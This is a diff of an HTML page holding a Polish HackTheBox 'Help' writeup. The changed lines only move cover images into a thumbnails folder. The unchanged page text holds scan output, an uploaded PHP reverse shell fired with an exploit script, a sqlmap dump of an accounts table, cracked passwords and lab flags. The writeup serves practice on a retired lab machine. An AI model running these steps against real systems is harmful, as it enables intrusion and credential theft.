@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/help/" />
-<meta property="og:image" content="https://lavatann.github.io/Help.png" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Help.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-31T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-08-31T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Help.png" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Help.png" />
 <meta name="twitter:title" content="Help - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Help - 31.08.2021  NMap ┌──(kali㉿kali)-[~/htb/help] └─$ sudo nmap -p- -sS -A -T4 10.10.10.121 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 19:11 CEST Nmap scan report for 10.10.10.121 Host is up (0.054s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn't have a title (application/json; charset=utf-8).  Port 3000  FeroxBuster 403 11l 32w 291c http://10.10.10.121/.hta 403 11l 32w 296c http://10.10.10.121/.htpasswd 403 11l 32w 296c http://10.10.10.121/.htaccess 200 375l 968w 11321c http://10.10.10.121/index.html 301 9l 28w 317c http://10.10.10.121/javascript 403 11l 32w 307c http://10.10.10.121/javascript/.htpasswd 403 11l 32w 300c http://10.10.10.121/server-status 403 11l 32w 302c http://10.10.10.121/javascript/.hta 403 11l 32w 307c http://10.10.10.121/javascript/.htaccess 301 9l 28w 314c http://10.10.10.121/support 200 17l 42w 378c http://10.10.10.121/support/.gitattributes 403 11l 32w 304c http://10.10.10.121/support/.htpasswd 403 11l 32w 299c http://10.10.10.121/support/.hta 403 11l 32w 304c http://10.10.10.121/support/.htaccess 301 9l 28w 326c http://10.10.10.121/support/controllers 301 9l 28w 324c http://10.10.10.121/javascript/jquery 301 9l 28w 318c http://10.10.10.121/support/css 200 4l 13w 1150c http://10.10.10.121/support/favicon.ico 301 9l 28w 321c http://10.10.10.121/support/images 301 9l 28w 323c http://10.10.10.121/support/includes 200 97l 236w 4453c http://10.10.10.121/support/index.php 301 9l 28w 317c http://10.10.10.121/support/js 301 9l 28w 322c http://10.10.10.121/support/uploads 301 9l 28w 320c http://10.10.10.121/support/views  Strony Wersja to 1.0.2\nUpload reverse shella a następnie:\npython 40300.py http://10.10.10.121/support/uploads/tickets/ reverse-shell-win.php user.txt\nbb8a7b36bdce0c61ccebaa173ef946af\nhttp://10.10.10.121/support/uploads/tickets/a027ef6fc02de9b54c5c385bd0b7eb37.php\n Privilege Escalation grep -Ri password graphql/schema/resolvers/index.js:const user = { username:'helpme@helpme.com', password:'5d3c93182bb20f07b994a7f617e99cff' } hasło to godhelpmeplz\n Aplikacja na porcie 3000:\nhttps://github.com/chryb/graphql-apollo-boilerplate\n pspy sqlmap sqlmap -r ticket.req --batch --dump -T \"accounts\" Table stuff d318f44739dced66793b1a603028133a76ae680e:Welcome1\nssh help@10.10.10.121 Welcome1  .bash_history rOOTmEoRdIE\nOdwrócenie:\nRootMeOrDie\nroot.txt\nb7fe6082dcdf0c1b1e02ab0d9daddb98\n",
   "wordCount" : "280",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Help.png","datePublished": "2021-08-31T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Help.png","datePublished": "2021-08-31T00:00:00Z",
   "dateModified": "2021-08-31T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Help.png" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Help.png" alt="">
         
 </figure><div class="toc">
     <details >
